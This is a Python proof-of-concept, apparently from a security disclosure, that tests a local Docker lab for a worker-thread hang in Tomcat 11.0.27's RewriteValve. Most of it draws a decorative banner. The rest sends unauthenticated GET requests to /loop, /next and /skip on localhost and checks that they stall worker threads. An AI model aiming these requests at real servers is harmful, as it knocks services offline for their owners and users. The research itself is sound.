#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: tomcat-rewrite-ns-loop (High: 7.5)
#  Vendor: Apache Tomcat (ASF)
#  Versions: Apache Tomcat 11.0.27
#  Impact: RewriteValve [NS]/[N]/[S=-1] pins a worker on one unauth GET
#  Requires: RewriteValve enabled; matching rewrite.config; loopback lab
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "tomcat-rewrite-ns-loop"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Witness Tomcat 11.0.27 RewriteValve [NS]/[N]/[S=-1] worker-thread hang."""

import http.client
import os
import socket
import subprocess
import threading
import time
from dataclasses import dataclass
from pathlib import Path

LABEL = "TOMCAT-REWRITE-NS-LOOP"
WITNESS = "TOMCAT-REWRITE-NS-LOOP-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "tomcat-rewrite-ns-loop")
HERE = Path(__file__).resolve().parent
HOST = "127.0.0.1"
PORT = 18910
EXPECTED_VERSION = "11.0.27"
OK_TIMEOUT_S = 2.0
HANG_TIMEOUT_S = 4.0
SIBLING_HANG_TIMEOUT_S = 12.0
OK_STATUSES = {200, 404}


@dataclass(frozen=True)
class Probe:
    path: str
    status: int | None
    elapsed_s: float
    timed_out: bool
    error: str

    @property
    def completed_ok(self) -> bool:
        return (not self.timed_out) and self.status in OK_STATUSES

    @property
    def hung(self) -> bool:
        return self.timed_out and self.status is None


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def compose(*args: str, timeout: int = 30) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def probe(path: str, timeout_s: float) -> Probe:
    started = time.monotonic()
    conn: http.client.HTTPConnection | None = None
    try:
        conn = http.client.HTTPConnection(HOST, PORT, timeout=timeout_s)
        conn.request("GET", path, headers={"Host": "localhost", "Connection": "close"})
        resp = conn.getresponse()
        status = int(resp.status)
        resp.read(256)
        return Probe(path, status, time.monotonic() - started, False, "")
    except (TimeoutError, socket.timeout):
        return Probe(path, None, time.monotonic() - started, True, "timeout")
    except OSError as exc:
        return Probe(path, None, time.monotonic() - started, False, f"os:{exc}")
    finally:
        if conn is not None:
            try:
                conn.close()
            except OSError:
                pass


def summarize(name: str, result: Probe) -> None:
    log(
        f"{name} path={result.path} status={result.status} "
        f"elapsed={result.elapsed_s:.3f}s timed_out={int(result.timed_out)} "
        f"error={result.error!r}"
    )


def tomcat_version() -> str:
    proc = compose(
        "exec",
        "-T",
        "tomcat",
        "bash",
        "-lc",
        "grep 'Apache Tomcat Version' /usr/local/tomcat/RELEASE-NOTES | head -1",
        timeout=20,
    )
    text = ((proc.stdout or "") + (proc.stderr or "")).strip()
    log(f"version-line {text!r} rc={proc.returncode}")
    return text


def catalina_logs() -> str:
    proc = compose("logs", "--no-color", "--tail", "80", "tomcat", timeout=20)
    return ((proc.stdout or "") + (proc.stderr or "")).strip()


def log_rewrite_iocs() -> None:
    blob = catalina_logs()
    needles = ("rewrite", "RewriteValve", "SEVERE", "LifecycleException", EXPECTED_VERSION)
    for line in blob.splitlines():
        if any(tok.lower() in line.lower() for tok in needles):
            log(f"IOC catalina {line.strip()[:300]}")


def expect_complete(name: str, path: str) -> bool:
    result = probe(path, OK_TIMEOUT_S)
    summarize(name, result)
    return result.completed_ok


def expect_hang(name: str, path: str) -> bool:
    result = probe(path, HANG_TIMEOUT_S)
    summarize(name, result)
    return result.hung


def sibling_alive() -> bool:
    holder: list[Probe] = []

    def worker() -> None:
        holder.append(probe("/loop", SIBLING_HANG_TIMEOUT_S))

    thread = threading.Thread(target=worker, daemon=True, name="ns-loop-inflight")
    thread.start()
    time.sleep(0.5)
    ok = probe("/ok", OK_TIMEOUT_S)
    summarize("sibling-ok", ok)
    alive = thread.is_alive()
    log(f"sibling-inflight-alive={int(alive)}")
    if holder:
        summarize("sibling-loop", holder[0])
    return ok.completed_ok and alive


def main() -> int:
    log(f"label={LABEL} target={HOST}:{PORT} expected={EXPECTED_VERSION}")
    version = tomcat_version()
    if EXPECTED_VERSION not in version:
        log_rewrite_iocs()
        return fail("version-not-11.0.27")

    control_ok = expect_complete("control-ok", "/ok")
    if not control_ok:
        log_rewrite_iocs()
        return fail("control-ok=no")

    ns_hang = expect_hang("ns-hang", "/loop")
    if not ns_hang:
        log_rewrite_iocs()
        return fail("ns-hang=no")

    l_ns_safe = expect_complete("L-ns-safe", "/safe")
    if not l_ns_safe:
        log_rewrite_iocs()
        return fail("L-ns-safe=no")

    n_hang = expect_hang("n-hang", "/next")
    if not n_hang:
        log_rewrite_iocs()
        return fail("n-hang=no")

    skip_hang = expect_hang("skip-hang", "/skip")
    if not skip_hang:
        log_rewrite_iocs()
        return fail("skip-hang=no")

    sibling = sibling_alive()
    if not sibling:
        log_rewrite_iocs()
        return fail("sibling-alive=no")

    log(
        f"SUCCESS {LABEL} control-ok=yes ns-hang=yes L-ns-safe=yes "
        f"n-hang=yes skip-hang=yes sibling-alive=yes {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

